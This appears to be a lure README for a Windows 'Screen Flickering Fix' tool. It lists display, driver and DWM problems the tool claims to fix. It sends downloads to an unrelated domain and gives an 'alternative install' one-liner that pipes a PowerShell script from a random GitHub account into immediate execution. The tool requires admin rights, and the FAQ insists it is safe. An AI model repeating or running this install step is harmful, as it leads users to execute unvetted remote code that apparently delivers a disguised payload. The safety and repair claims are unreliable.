<div align="center">

<img src="https://img.shields.io/badge/Screen_Flickering_Fix-v1.2.0-2ea44f?style=for-the-badge" alt="Screen Flickering Fix">

# Screen Flickering Fix

**Fix screen flickering, flashing, and display driver issues on Windows 10/11.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/Version-1.2.0-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)

<br>

[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://display.nexustool.fun/)

</div>

---

## About

**Screen Flickering Fix** diagnoses and repairs screen flickering, flashing, blinking, and display driver problems on Windows. It identifies whether the issue is caused by an incompatible display driver, a problematic app, or incorrect refresh rate settings, then applies the correct fix automatically.

### Alternative install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems This Fixes

### Screen Flickering & Flashing

| Symptom | Cause | Fix Applied |
|---|---|---|
| **Screen flickers constantly** | Incompatible display driver | Driver rollback or clean reinstall |
| **Screen flashes black** every few seconds | Display driver crash (TDR) | Increases TDR timeout, reinstalls driver |
| **Flickering only in certain apps** | App incompatibility with GPU | Disables hardware acceleration for app |
| **Screen flickers after Windows Update** | Update installed wrong driver | Rolls back to previous working driver |
| **Flickering on external monitor** | Incorrect refresh rate or cable issue | Resets refresh rate, checks connection |
| **Taskbar flickering** | Incompatible background service | Identifies and disables conflicting service |
| **Screen goes black randomly** | GPU driver timeout (TDR) | Resets TDR delay registry value |
| **Flickering at specific refresh rate** | Monitor can't sustain the rate | Sets optimal refresh rate |
| **Screen tearing** | V-Sync or compositor issue | Resets Desktop Window Manager |

### Desktop Window Manager (DWM) Issues

| Symptom | Fix Applied |
|---|---|
| **dwm.exe high GPU usage** (50-100%) | Disables hardware acceleration in DWM, resets compositor |
| **dwm.exe high CPU usage** | Disables transparency effects, resets DWM |
| **Desktop Window Manager high memory** | Restarts DWM, clears compositor cache |
| **DWM keeps crashing and restarting** | Repairs DWM service, resets graphics driver |

### Display Driver Issues

| Error | Fix Applied |
|---|---|
| **"Display driver stopped responding and has recovered"** | Increases TDR timeout, reinstalls driver |
| **"Display driver failed to start"** | Clean driver removal + reinstall via Windows Update |
| **VIDEO_TDR_FAILURE blue screen** | Full driver reset, TDR registry fix |
| **Black screen after driver update** | Safe mode driver rollback |
| **Resolution stuck at low resolution** | Reinstalls display adapter, resets resolution |
| **Second monitor not detected** | Resets display adapter, rescans outputs |
| **Brightness slider missing** | Reinstalls monitor driver |
| **HDR not working** | Resets HDR registry settings |
| **Night Light not working** | Repairs Night Light service |

---

## Preview

```
  +---------------------------------------------------+
  |         Screen Flickering Fix v1.2.0              |
  +---------------------------------------------------+
  |                                                   |
  |  Display Adapters:                                |
  |  [!] NVIDIA GeForce RTX 3060  -- Driver crash     |
  |  [OK] Intel UHD Graphics 770  -- Working          |
  |                                                   |
  |  Monitor:                                         |
  |  [OK] ASUS VG248QE            -- 144Hz            |
  |                                                   |
  |  Issues Found:                                    |
  |  [!] TDR timeout too low (2s, should be 8s)       |
  |  [!] Display driver version outdated              |
  |  [!] Desktop Window Manager restarting            |
  |                                                   |
  |  [ Fix All ]    [ Test Display ]    [ Exit ]      |
  |                                                   |
  +---------------------------------------------------+
```

---

## How It Works

1. **Detect** -- Identifies all display adapters and connected monitors
2. **Diagnose** -- Checks driver version, TDR settings, refresh rate, DWM status
3. **Repair** -- Reinstalls drivers, adjusts TDR timeout, resets display settings
4. **Verify** -- Monitors display stability for 30 seconds after repair

---

## Supported Hardware

**NVIDIA** -- GeForce GTX/RTX, Quadro, all driver versions
**AMD** -- Radeon RX, Radeon Pro, all driver versions
**Intel** -- UHD Graphics, Iris Xe, Arc, all driver versions
**Monitors** -- All resolutions from 1080p to 8K, refresh rates 60Hz-360Hz

---

## When To Use

- Screen started flickering after a **Windows Update**
- You updated your **GPU driver** and now the screen flashes
- **External monitor** flickers but laptop screen is fine
- Games cause **screen tearing** or black flashes
- You see **"Display driver stopped responding"** notifications
- Screen **goes black for 1-2 seconds** randomly
- **Brightness changes** by itself

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## FAQ

**My screen is completely black. How do I run this?**
Boot into Safe Mode (hold Shift while clicking Restart), then run the tool. It works in Safe Mode.

**Will it reinstall my GPU driver?**
Only if the current driver is identified as the problem. It uses Windows Update to install a stable driver, not the latest beta.

**Is it safe?**
Yes. The tool uses Windows Device Manager APIs and standard registry settings. All changes can be reverted.

**I have dual monitors and only one flickers.**
The tool detects per-monitor issues and applies fixes only to the affected display adapter and output.

---

## License

[MIT](LICENSE)
